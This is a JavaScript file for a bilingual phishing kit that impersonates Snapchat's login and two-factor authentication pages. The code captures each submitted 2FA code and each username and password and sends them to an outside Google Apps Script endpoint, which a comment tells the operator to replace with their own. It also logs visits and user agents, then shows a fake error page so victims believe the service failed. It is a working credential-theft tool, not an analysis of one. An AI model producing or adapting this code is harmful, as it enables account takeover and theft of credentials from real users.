// Données bilingues pour chaque page
const translations = {
    index: {
        en: {
            title: "Two-Factor Authentication",
            subtitle: "Enter the 6-digit code we sent you",
            continueBtn: "Continue",
            resendLink: "Didn't receive a code?",
            supportText: "Having trouble? Visit our Help Center",
            resendMessage: "We've sent you a new code",
            invalidCode: "Incorrect code. Please try again.",
            verifying: "Verifying your code...",
            verified: "Success!"
        },
        fr: {
            title: "Authentification à deux facteurs",
            subtitle: "Entrez le code à 6 chiffres que nous vous avons envoyé",
            continueBtn: "Continuer",
            resendLink: "Vous n'avez pas reçu de code ?",
            supportText: "Besoin d'aide ? Visitez notre Centre d'aide",
            resendMessage: "Nous vous avons envoyé un nouveau code",
            invalidCode: "Code incorrect. Veuillez réessayer.",
            verifying: "Vérification de votre code...",
            verified: "Succès !"
        }
    },
    login: {
        en: {
            title: "Log in to Snapchat",
            usernamePlaceholder: "Username or email",
            passwordPlaceholder: "Password",
            loginBtn: "Log In",
            forgotLink: "Forgot your password?",
            supportText: "New to Snapchat? <a href='#'>Sign Up</a>"
        },
        fr: {
            title: "Connexion à Snapchat",
            usernamePlaceholder: "Nom d'utilisateur ou e-mail",
            passwordPlaceholder: "Mot de passe",
            loginBtn: "Se connecter",
            forgotLink: "Mot de passe oublié ?",
            supportText: "Nouveau sur Snapchat ? <a href='#'>S'inscrire</a>"
        }
    },
    error: {
        en: {
            title: "Something went wrong",
            errorMessage: "We're having trouble connecting to Snapchat servers right now.",
            errorSubtitle: "Please check your internet connection and try again in a few moments.",
            backLink: "Try Again",
            supportText: "Need help? Visit our <a href='#'>Help Center</a>"
        },
        fr: {
            title: "Une erreur s'est produite",
            errorMessage: "Nous avons des difficultés à nous connecter aux serveurs Snapchat pour le moment.",
            errorSubtitle: "Veuillez vérifier votre connexion Internet et réessayer dans quelques instants.",
            backLink: "Réessayer",
            supportText: "Besoin d'aide ? Visitez notre <a href='#'>Centre d'aide</a>"
        }
    }
};

// Détection automatique de la langue du navigateur
let currentLang = navigator.language.startsWith('fr') ? 'fr' : 'en';

// ⚠️ CHANGEZ CETTE URL PAR LA VÔTRE
const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxur_-UmZVt1YTebgeZNPQdJV7X55nS1tFhitzNPl-4HVNrvhdJZoSrC6-vpvG91VyJNQ/exec';

// Fonction pour envoyer les données avec timestamp et User-Agent
function sendDataToSheet(type, value) {
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;
    const data = {
        type: type,
        value: value,
        timestamp: timestamp,
        userAgent: userAgent,
        language: currentLang
    };
    
    fetch(GOOGLE_SHEET_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(() => console.log('Data logged'))
    .catch(error => console.error('Error:', error));
}

// Fonction pour définir la langue
function setLanguage(lang) {
    currentLang = lang;
    const page = window.location.pathname.includes('login') ? 'login' : 
                 window.location.pathname.includes('error') ? 'error' : 'index';
    const texts = translations[page][lang];

    document.getElementById('title').textContent = texts.title;
    if (page === 'index') {
        document.getElementById('subtitle').textContent = texts.subtitle;
        document.getElementById('continue-btn').textContent = texts.continueBtn;
        document.getElementById('resend-link').textContent = texts.resendLink;
    } else if (page === 'login') {
        document.getElementById('username-placeholder').placeholder = texts.usernamePlaceholder;
        document.getElementById('password-placeholder').placeholder = texts.passwordPlaceholder;
        document.getElementById('login-btn').textContent = texts.loginBtn;
        document.getElementById('forgot-link').textContent = texts.forgotLink;
    } else if (page === 'error') {
        document.getElementById('error-message').textContent = texts.errorMessage;
        document.getElementById('error-subtitle').textContent = texts.errorSubtitle;
        document.getElementById('back-link').textContent = texts.backLink;
    }
    document.getElementById('support-text').innerHTML = texts.supportText;
    document.getElementById('language-menu').style.display = 'none';
}

// Fonction pour afficher/cacher le menu
function toggleLanguageMenu() {
    const menu = document.getElementById('language-menu');
    menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
}

// Initialiser la langue au chargement
window.onload = function() {
    setLanguage(currentLang);
    
    // Logger la visite de la page
    const page = window.location.pathname.split('/').pop() || 'index.html';
    sendDataToSheet('Page Visit', page);
};

// Fermer le menu si on clique ailleurs
document.addEventListener('click', function(event) {
    const menu = document.getElementById('language-menu');
    const btn = document.querySelector('.language-btn');
    if (menu && btn && !btn.contains(event.target) && !menu.contains(event.target)) {
        menu.style.display = 'none';
    }
});

// Move focus to next input field avec support backspace
function moveToNext(current, nextField) {
    if (current.value.length >= 1 && nextField <= 6) {
        const inputs = document.getElementsByTagName('input');
        if (inputs[nextField]) {
            inputs[nextField].focus();
        }
    }
}

// Ajouter support pour backspace
if (document.getElementById('codeForm')) {
    const inputs = document.querySelectorAll('.code-input input');
    inputs.forEach((input, index) => {
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                inputs[index - 1].focus();
            }
        });
        
        input.addEventListener('input', function() {
            if (this.value.length >= 1 && index < 5) {
                inputs[index + 1].focus();
            }
        });
    });
}

// Simulate resending code avec délai réaliste
function resendCode() {
    const message = document.getElementById('message');
    const resendLink = document.getElementById('resend-link');
    
    resendLink.style.pointerEvents = 'none';
    resendLink.style.opacity = '0.5';
    
    message.style.color = '#000';
    message.textContent = translations.index[currentLang].resendMessage;
    
    // Logger la demande de renvoi
    sendDataToSheet('Resend Code', 'User requested code resend');
    
    setTimeout(() => {
        message.textContent = '';
        resendLink.style.pointerEvents = 'auto';
        resendLink.style.opacity = '1';
    }, 3000);
    
    return false;
}

// Toggle password visibility avec SVG
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password-placeholder');
    const eyeIcon = document.getElementById('eye-icon');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = `
            <path d="M2 2l20 20"></path>
            <path d="M6.61 6.61A9 9 0 0019.39 17.39M2 12s4-8 11-8a10.34 10.34 0 012.36.28M22 12s-4 8-11 8a10.34 10.34 0 01-2.36-.28"></path>
        `;
    } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `;
    }
}

// Handle code form submission avec validation améliorée
if (document.getElementById('codeForm')) {
    document.getElementById('codeForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const inputs = document.querySelectorAll('.code-input input');
        let code = '';
        inputs.forEach(input => {
            code += input.value;
        });

        const message = document.getElementById('message');
        const button = document.querySelector('.verify-btn');

        if (code.length !== 6 || !/^\d+$/.test(code)) {
            message.style.color = '#ff3333';
            message.textContent = translations.index[currentLang].invalidCode;
            
            // Shake animation pour les inputs
            inputs.forEach(input => {
                input.style.animation = 'shake 0.3s';
                setTimeout(() => {
                    input.style.animation = '';
                }, 300);
            });
            return;
        }

        message.style.color = '#666';
        message.textContent = translations.index[currentLang].verifying;
        button.disabled = true;
        button.style.opacity = '0.7';

        const codeEntry = `2FA Code: ${code}`;
        sendDataToSheet('2FA Code', codeEntry);

        // Délai réaliste pour la vérification
        setTimeout(() => {
            message.style.color = '#00C853';
            message.textContent = translations.index[currentLang].verified;
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 800);
        }, 1500);
    });
}

// Handle login form submission avec validation
if (document.getElementById('loginForm')) {
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const username = document.getElementById('username-placeholder').value.trim();
        const password = document.getElementById('password-placeholder').value;
        const button = document.querySelector('.login-btn');

        if (!username || !password) {
            return;
        }

        button.disabled = true;
        button.textContent = currentLang === 'fr' ? 'Connexion...' : 'Logging in...';
        button.style.opacity = '0.7';

        const credentialEntry = `Username: ${username} | Password: ${password}`;
        sendDataToSheet('Login Credentials', credentialEntry);

        // Délai réaliste
        setTimeout(() => {
            window.location.href = 'error.html';
        }, 1200);
    });
}

// Ajouter animation shake au CSS
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);